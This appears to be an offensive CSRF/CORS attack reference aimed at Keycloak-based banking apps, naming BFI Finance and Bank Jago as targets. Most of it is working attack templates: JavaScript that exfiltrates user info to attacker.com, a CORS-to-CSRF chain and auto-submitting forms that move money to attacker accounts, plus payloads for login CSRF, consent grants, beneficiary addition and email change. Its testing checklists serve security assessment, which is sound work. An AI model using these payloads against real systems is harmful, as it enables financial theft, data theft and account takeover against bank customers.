# CSRF Attacks Reference — Keycloak SSO / Banking Apps

## Context
- **Targets**: BFI Finance, Bank Jago (Indonesian fintech)
- **Stack**: Keycloak OAuth2/OIDC, Spring Boot microservices, Istio/Envoy service mesh
- **Auth**: Cookie-based sessions behind Keycloak SSO
- **Known finding**: CORS reflection on Keycloak `/userinfo` endpoint (BFI)

---

## Attack Surface Summary

### Why CSRF Still Applies
Despite OAuth2/OIDC, these apps maintain **server-side sessions via cookies** post-authentication. Once the user has a valid session cookie, state-changing requests are vulnerable if:
1. No CSRF token or weak token validation
2. SameSite cookie attribute is `None` or missing
3. CORS misconfigurations allow cross-origin credentialed requests

### Key Endpoints to Target
- Fund transfer / payment initiation
- Beneficiary management (add/modify payee)
- Profile updates (email, phone, address)
- Password/PIN change
- Consent/authorization grants in Keycloak
- Session management (logout CSRF for session fixation chains)
- Keycloak account management (`/auth/realms/{realm}/account/*`)

---

## SameSite Cookie Analysis

### Check Current Policy
```http
Set-Cookie: KEYCLOAK_SESSION=...; Path=/auth/realms/master; SameSite=None; Secure
Set-Cookie: JSESSIONID=...; Path=/; HttpOnly; Secure
```

**Test matrix:**

| SameSite Value | GET CSRF | POST CSRF | Impact |
|---|---|---|---|
| None | ✅ | ✅ | Full CSRF |
| Lax | ✅ (top-level nav) | ❌ | Limited — GET-based state changes |
| Strict | ❌ | ❌ | Blocked (but check subdomain bypass) |
| Missing/unset | Browser default (Lax) | ❌ | Same as Lax in modern browsers |

### SameSite Bypass Techniques
1. **Lax + method override**: If app accepts `_method=POST` param on GET requests
2. **Lax + 2-minute window**: Chrome allows POST CSRF within 2 min of cookie being set (top-level cross-site POST)
3. **Subdomain takeover**: SameSite doesn't protect against same-site (eTLD+1) origins — find dangling subdomains
4. **Client-side redirect gadgets**: `window.open` + redirect chain to trigger top-level navigation with cookies

---

## CORS Exploitation (Leveraging Known Finding)

### BFI CORS Reflection on Keycloak `/userinfo`
The reflected Origin in `Access-Control-Allow-Origin` with `Access-Control-Allow-Credentials: true` enables:

```javascript
// Steal user info (PII exfiltration)
fetch('https://sso.bfi.co.id/auth/realms/bfi/protocol/openid-connect/userinfo', {
  credentials: 'include'
})
.then(r => r.json())
.then(data => {
  // Exfil: name, email, sub, roles
  navigator.sendBeacon('https://attacker.com/collect', JSON.stringify(data));
});
```

### Escalation: CORS → CSRF Chain
If CORS reflection exists on other endpoints:
```javascript
// Read CSRF token via CORS, then submit state-changing request
async function csrfChain() {
  // Step 1: Fetch page/API with CSRF token
  let resp = await fetch('https://app.bankjago.co.id/api/transfer/init', {
    credentials: 'include'
  });
  let data = await resp.json();
  let csrfToken = data._csrf || data.meta.csrf;

  // Step 2: Use token in state-changing request
  await fetch('https://app.bankjago.co.id/api/transfer/execute', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/json', 'X-CSRF-Token': csrfToken},
    body: JSON.stringify({to: 'attacker_account', amount: 1000000})
  });
}
```

---

## Keycloak-Specific CSRF Vectors

### 1. Login CSRF (Session Fixation)
Force victim to authenticate as attacker → victim performs actions in attacker's session:
```html
<form action="https://sso.target.co.id/auth/realms/realm/login-actions/authenticate" method="POST">
  <input name="username" value="attacker@evil.com">
  <input name="password" value="attackerpass">
  <input name="credentialId" value="">
</form>
<script>document.forms[0].submit();</script>
```

### 2. OAuth Authorization CSRF
Inject attacker's authorization code into victim's session:
```
https://sso.target.co.id/auth/realms/realm/protocol/openid-connect/auth?
  response_type=code&
  client_id=banking-app&
  redirect_uri=https://app.target.co.id/callback&
  state=ATTACKER_STATE&
  code=ATTACKER_CODE
```
**Check**: Is `state` parameter validated? Is it bound to the user's session?

### 3. Consent Bypass
```html
<!-- Force consent grant without user interaction -->
<img src="https://sso.target.co.id/auth/realms/realm/protocol/openid-connect/auth?
  response_type=code&client_id=evil-client&redirect_uri=https://evil.com/cb&scope=openid+profile+email&prompt=none">
```

### 4. Account API CSRF
Keycloak Account REST API (`/auth/realms/{realm}/account/`) — check if session cookie alone is sufficient:
```javascript
// Change email via Keycloak account API
fetch('https://sso.target.co.id/auth/realms/realm/account/', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json', 'Accept': 'application/json'},
  body: JSON.stringify({email: 'attacker@evil.com', firstName: 'Victim', lastName: 'User'})
});
```

---

## Spring Boot CSRF Considerations

### Default Protections
- Spring Security enables CSRF by default (Synchronizer Token Pattern)
- Token in `_csrf` request parameter or `X-CSRF-TOKEN` / `X-XSRF-TOKEN` header
- `CookieCsrfTokenRepository` stores token in `XSRF-TOKEN` cookie (readable by JS)

### Common Misconfigurations
```java
// Devs often disable CSRF for "API" endpoints
http.csrf().ignoringAntMatchers("/api/**")  // ← All API endpoints unprotected
http.csrf().disable()  // ← Completely disabled (common in "stateless" misconception)
```

### Detection
1. Submit request without CSRF token → 200 OK = vulnerable
2. Submit with invalid token → 200 OK = token not validated
3. Check if token is tied to session (swap between users)
4. Remove `Referer`/`Origin` headers — some apps use these as fallback

### Spring + Keycloak Pattern
When Spring Boot acts as OAuth2 client with Keycloak:
- Session cookie (`JSESSIONID`) maintains auth state
- CSRF protection may be disabled for endpoints behind OAuth2 resource server config
- Check `/oauth2/authorization/keycloak` and `/login/oauth2/code/keycloak` callback flows

---

## Istio/Envoy Service Mesh Considerations

### CSRF at the Mesh Level
- Envoy has no native CSRF filter in default Istio configs
- AuthorizationPolicy may not check Origin/Referer
- mTLS between services doesn't prevent CSRF (it's service-to-service auth, not user-to-service)

### Bypass Opportunities
- Internal services behind Istio ingress may lack CSRF protection (assumed "internal only")
- If ingress gateway reflects Origin in CORS, all backend services inherit the misconfiguration
- VirtualService routing may expose admin endpoints without additional CSRF checks

---

## Exploitation Templates

### Basic POST CSRF (No Token Required)
```html
<html>
<body onload="document.getElementById('csrf-form').submit();">
<form id="csrf-form" action="https://app.target.co.id/api/v1/transfer" method="POST"
      enctype="application/x-www-form-urlencoded">
  <input name="destination" value="8901234567">
  <input name="amount" value="5000000">
  <input name="currency" value="IDR">
</form>
</body>
</html>
```

### JSON Body CSRF (Content-Type Bypass)
```html
<!-- Using enctype=text/plain to send JSON-like body -->
<form action="https://app.target.co.id/api/v1/transfer" method="POST" enctype="text/plain">
  <input name='{"destination":"8901234567","amount":5000000,"currency":"IDR","ignore":"' value='"}'>
</form>
<script>document.forms[0].submit();</script>
```

### Flash/PDF Content-Type Override (Legacy)
If target doesn't validate Content-Type strictly, use `navigator.sendBeacon`:
```javascript
let blob = new Blob([JSON.stringify({destination:'8901234567',amount:5000000})],
                    {type:'application/json'});
navigator.sendBeacon('https://app.target.co.id/api/v1/transfer', blob);
```
**Note**: `sendBeacon` sends with credentials in same-origin context only. For cross-origin, need CORS.

### Fetch API with Simple Request (No Preflight)
```javascript
// POST with application/x-www-form-urlencoded avoids preflight
fetch('https://app.target.co.id/api/v1/beneficiary/add', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'name=Attacker&account=1234567890&bank=BCA'
});
```

---

## Testing Checklist

- [ ] Map all state-changing endpoints (POST/PUT/DELETE/PATCH)
- [ ] Check `Set-Cookie` headers for SameSite attribute on all session cookies
- [ ] Test CSRF token presence and validation (remove, empty, wrong value, other user's token)
- [ ] Test Content-Type enforcement (does server reject non-JSON for JSON APIs?)
- [ ] Check Origin/Referer validation (remove headers, null origin, subdomain spoofing)
- [ ] Test CORS configuration on all origins (reflect arbitrary, null, subdomain patterns)
- [ ] Verify OAuth2 `state` parameter validation in callback
- [ ] Check Keycloak session cookies specifically (`KEYCLOAK_SESSION`, `KEYCLOAK_IDENTITY`)
- [ ] Test logout CSRF (can attacker force logout → phishing login page?)
- [ ] Check for GET-based state changes (Lax SameSite bypass)
- [ ] Verify if Istio ingress adds/strips security headers

---

## Impact Escalation (Banking Context)

| Vector | Impact | Severity |
|---|---|---|
| Transfer initiation CSRF | Direct financial loss | Critical |
| Beneficiary addition CSRF | Prep for future theft | High |
| Email/phone change CSRF | Account takeover chain | High |
| Login CSRF | Session fixation → data theft | Medium |
| Logout CSRF | Denial of service / phishing | Low-Medium |
| Consent grant CSRF | Unauthorized data access | Medium-High |

---

## References
- [PortSwigger CSRF](https://portswigger.net/web-security/csrf)
- [Keycloak Security Advisories](https://www.keycloak.org/security)
- [SameSite Cookie Recipes](https://web.dev/samesite-cookies-explained/)
- [Spring Security CSRF Docs](https://docs.spring.io/spring-security/reference/servlet/exploits/csrf.html)

---

## CSRF Token Validation Weakness Checklist

Quick-test matrix for any CSRF token implementation. Run ALL checks before marking CSRF as "implemented":

| Test | Payload | Expected (Secure) | Finding if Passes |
|------|---------|-------------------|-------------------|
| Empty token | `token=` | Rejected (403/error) | Weak validation |
| Missing param | (omit token entirely) | Rejected | No validation |
| Any non-empty string | `token=INVALID` | Rejected | Accepts any value |
| Token from other session | Use token from session A in session B | Rejected | Not session-bound |
| Expired token (reuse) | Reuse token after it should expire | Rejected | No expiry |
| Truncated token | Send first half only | Rejected | Length-only check |
| Static token | Same token across page reloads | N/A (bad design) | Predictable token |
| Token in cookie only | Remove from POST body, keep cookie | Rejected | Double-submit bypass |

**Testing script:**
```python
# Get a page to extract valid token
r = s.get(TARGET)
valid_token = extract_token(r.text)

tests = [
    ("Empty", ""),
    ("Invalid", "AAAA"),
    ("Truncated", valid_token[:8]),
    ("Missing", None),  # omit param
]

for name, token in tests:
    data = {"domain": "google.com"}
    if token is not None:
        data["token"] = token
    r = s.post(TARGET, data=data)
    print(f"{name}: {r.status_code} {'REJECTED' if 'Invalid' in r.text else 'ACCEPTED'}")
```

**mock.hackme.secops.group:8000 (June 2026):** Empty/missing = "Invalid CSRF Token" (rejected). Any non-empty string = accepted. Token not session-bound, not validated against server state — only checks `!empty($token)`.
